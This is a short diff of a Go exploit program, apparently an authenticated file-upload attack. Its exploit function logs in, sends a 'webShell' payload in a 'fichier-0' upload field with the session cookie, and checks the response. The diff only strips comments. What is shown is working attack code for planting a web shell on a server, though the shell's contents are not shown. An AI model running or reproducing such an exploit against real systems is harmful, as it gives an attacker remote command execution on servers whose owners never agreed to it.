@@ -73,11 +73,11 @@ func exploit(username, password, url string) {
 		return
 	}
 
-	// Add file and other parameters (in a real-world scenario, this would be done with multipart/form-data)
+	
 	file := fmt.Sprintf("fichier-0=%s", webShell)
-	req.Header.Set("Cookie", cookies[0].String()) // Assuming only one cookie is necessary
+	req.Header.Set("Cookie", cookies[0].String()) 
 
-	// Send the request and check the response
+
 	uploadRes, err := client.Do(req)
 	if err != nil {
 		fmt.Println("Error: Failed to send upload request")
